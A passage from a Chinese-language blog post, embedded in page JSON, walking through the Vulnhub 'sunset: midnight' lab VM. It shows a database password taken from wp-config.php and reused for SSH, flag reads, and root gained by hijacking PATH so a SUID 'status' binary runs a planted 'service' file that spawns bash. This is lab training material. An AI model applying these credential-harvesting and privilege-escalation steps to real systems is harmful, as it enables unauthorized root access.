class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: enp0s3: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:a6:df:<span class=\"hljs-number\">28</span> brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.255</span> scope global dynamic enp0s3\n       valid_lft <span class=\"hljs-number\">431</span>sec preferred_lft <span class=\"hljs-number\">431</span>sec\n    inet6 fe80::a00:<span class=\"hljs-number\">27f</span>f:fea6:df28/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p><code>/var/www/html/wp-config.php</code> 发现<code>jose</code>账号密码（加密）</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-comment\">/** MySQL database username */</span>                                                                                                                               \ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'jose'</span> );                                                                                                                                 \n                                                                                                                                                             \n<span class=\"hljs-comment\">/** MySQL database password */</span>                                                                                                                               \ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'645dc5a8871d2a4269d4cbe23f6ae103'</span> ); \n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试破解</p>\n<p>看起来是<code>MD5</code>，使用开膛手以及在线网站破解，无果</p>\n</li>\n<li>\n<p>最后尝试直接使用这串字符串登录</p>\n<pre><code class=\"hljs language-c\">ssh jose@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>  \njose@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8'</span>s password: \nLinux midnight <span class=\"hljs-number\">4.19</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-9</span>-amd64 #<span class=\"hljs-number\">1</span> SMP Debian <span class=\"hljs-number\">4.19</span>.<span class=\"hljs-number\">118</span><span class=\"hljs-number\">-2</span>+deb10u1 (<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-06</span><span class=\"hljs-number\">-07</span>) x86_64\n\nThe programs included with the Debian GNU/Linux system are <span class=\"hljs-built_in\">free</span> software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described in the\nindividual files in /usr/share/doc<span class=\"hljs-comment\">/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Jul 18 15:33:29 2020 from 192.168.100.139\njose@midnight:~$ \n</span></code></pre>\n<p>登陆成功。。。神经</p>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p>家目录下<code>user.txt</code></p>\n<pre><code class=\"hljs language-c\">jose@midnight:~$ cat user.txt \n<span class=\"hljs-number\">956</span>a9564aa5632edca7b745c696f6575\n</code></pre>\n<p>应该是flag</p>\n</li>\n<li>\n<p>suid</p>\n<pre><code class=\"hljs language-c\">jose@midnight:~$ find / -perm -u=s -type f <span class=\"hljs-number\">2</span>>/dev/null\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/status\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus<span class=\"hljs-number\">-1.0</span>/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><code>suid</code>发现<code>/usr/bin/status</code> 尝试执行</p>\n<pre><code class=\"hljs language-c\">jose@midnight:/tmp$ status\nsh: <span class=\"hljs-number\">1</span>: service: not found\nStatus of the SSH server:\n</code></pre>\n<p>去寻找了<code>service</code>，但是没找到</p>\n</li>\n<li>\n<p>思路：在新建<code>service</code>然后里边是提权代码，让<code>status</code>去找它（通过环境变量）</p>\n<ul>\n<li>\n<p>新建<code>service</code>文件</p>\n<pre><code class=\"hljs language-c\">jose@midnight:/tmp$ echo <span class=\"hljs-string\">\"/bin/bash\"</span> > service\njose@midnight:/tmp$ chmod <span class=\"hljs-number\">777</span> service \n</code></pre>\n</li>\n<li>\n<p>修改环境变量，将<code>/tmp</code>目录放在前头（看目录进行修改）</p>\n<pre><code class=\"hljs language-c\">jose@midnight:/tmp$ export PATH=/tmp:$PATH\njose@midnight:/tmp$ echo $PATH\n/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\n</code></pre>\n</li>\n<li>\n<p>运行<code>status</code></p>\n<pre><code class=\"hljs language-c\">jose@midnight:/tmp$ /usr/bin/status\nroot@midnight:/tmp# \n</code></pre>\n<p>获得root！！！</p>\n</li>\n</ul>\n</li>\n<li>\n<p>读取<code>flag</code></p>\n<pre><code class=\"hljs language-c\">root@midnight:~<span class=\"hljs-meta\"># cd /root</span>\nroot@midnight:/root<span class=\"hljs-meta\"># ls</span>\nroot.txt  status  status.c\nroot@midnight:/root<span class=\"hljs-meta\"># cat root.txt </span>\n          ___   ____\n        /<span class=\"hljs-string\">' --;^/ ,-_\\     \\ | /\n       / / --o\\ o-\\ \\\\   --(_)--\n      /-/-/|o|-|\\-\\\\|\\\\   / | \\\n       '</span>`  ` |-|   `` '\n             |-|\n             |-|O\n             |-(\\,__\n          ...|-|\\--,\\_....\n      ,;;;;;;;;;;;;;;;;;;;;;;;;,.\n~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------\n\ndb2def9d4ddcb83902b884de39d426e6\n\nThanks <span class=\"hljs-keyword\">for</span> playing! - Felipe Winsnes (@whitecr0wz)\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - sunset midnight","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"sunset: midnight\n\n https://www.vulnhub.com/entry/sunset-midnight,517/\n \n\n主机发现端口扫描\n\n1. 探测存活主机，`8`是靶机\n    \n    \n    \n2. 扫描靶机所有开放端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n   ..."},"recentPosts":[{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"}]},"__N_SSG":true}